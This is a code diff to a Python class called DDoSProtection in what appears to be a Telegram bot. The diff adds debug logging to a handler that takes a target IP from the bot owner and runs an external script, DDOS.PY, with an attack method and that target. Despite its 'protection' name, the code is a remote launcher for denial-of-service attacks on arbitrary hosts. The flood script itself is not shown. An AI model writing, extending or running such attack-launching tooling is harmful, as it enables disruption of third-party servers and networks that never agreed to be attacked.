@@ -327,8 +327,11 @@ class DDoSProtection:
     
     def handle_attack_button(self, call):
         """Handle attack button clicks"""
+        print(f"[ATTACK] Button clicked by user {call.from_user.id}: {call.data}")
+        
         # Owner-only check
         if call.from_user.id != self.OWNER_ID:
+            print(f"[ATTACK] Access denied for user {call.from_user.id}")
             self.bot.answer_callback_query(call.id, "❌ Access denied. Owner only command.")
             return
         
@@ -343,6 +346,7 @@ class DDoSProtection:
         }
         
         attack_name = attack_names.get(attack_type, "Unknown")
+        print(f"[ATTACK] Attack type selected: {attack_type} ({attack_name})")
         
         # Ask for target IP
         msg = self.bot.send_message(
@@ -354,21 +358,28 @@ class DDoSProtection:
         
         # Store the attack type for this user
         self.bot.register_next_step_handler(msg, self.process_attack_target, attack_type)
+        print(f"[ATTACK] Next step handler registered for attack type: {attack_type}")
     
     def process_attack_target(self, message, attack_type):
         """Process the target IP and execute attack"""
+        print(f"[ATTACK] Target received from user {message.from_user.id}: {message.text}")
+        
         # Owner-only check
         if message.from_user.id != self.OWNER_ID:
+            print(f"[ATTACK] Access denied for user {message.from_user.id}")
             self.bot.send_message(message.chat.id, "❌ Access denied. Owner only command.")
             return
         
         target = message.text.strip()
+        print(f"[ATTACK] Target IP: {target}, Attack type: {attack_type}")
         
         # Validate IP
         import socket
         try:
             socket.inet_aton(target)
+            print(f"[ATTACK] IP validation passed: {target}")
         except socket.error:
+            print(f"[ATTACK] IP validation failed: {target}")
             self.bot.send_message(message.chat.id, "❌ Invalid IP address format")
             return
         
@@ -384,6 +395,7 @@ class DDoSProtection:
             }
             
             method_id = attack_names.get(attack_type, "1")
+            print(f"[ATTACK] Method ID: {method_id}")
             
             self.bot.send_message(
                 message.chat.id,
@@ -400,6 +412,7 @@ class DDoSProtection:
             env['ATTACK_METHOD'] = method_id
             env['ATTACK_TARGET'] = target
             
+            print(f"[ATTACK] Executing DDOS.PY with method {method_id} and target {target}")
             result = subprocess.run(
                 ["python3", "/root/Protection-vc/DDOS.PY"],
                 capture_output=True,
@@ -408,7 +421,10 @@ class DDoSProtection:
                 env=env
             )
             
+            print(f"[ATTACK] DDOS.PY return code: {result.returncode}")
             output = result.stdout if result.stdout else result.stderr
+            print(f"[ATTACK] DDOS.PY output: {output[:200]}")
+            
             if output:
                 self.bot.send_message(
                     message.chat.id,
@@ -417,8 +433,10 @@ class DDoSProtection:
                 )
             
         except subprocess.TimeoutExpired:
+            print(f"[ATTACK] DDOS.PY execution timed out")
             self.bot.send_message(message.chat.id, "⚠️ DDOS.PY execution started (running in background)")
         except Exception as e:
+            print(f"[ATTACK] Error executing attack: {str(e)}")
             self.bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
     
     def init_userbot(self, api_id, api_hash, phone):
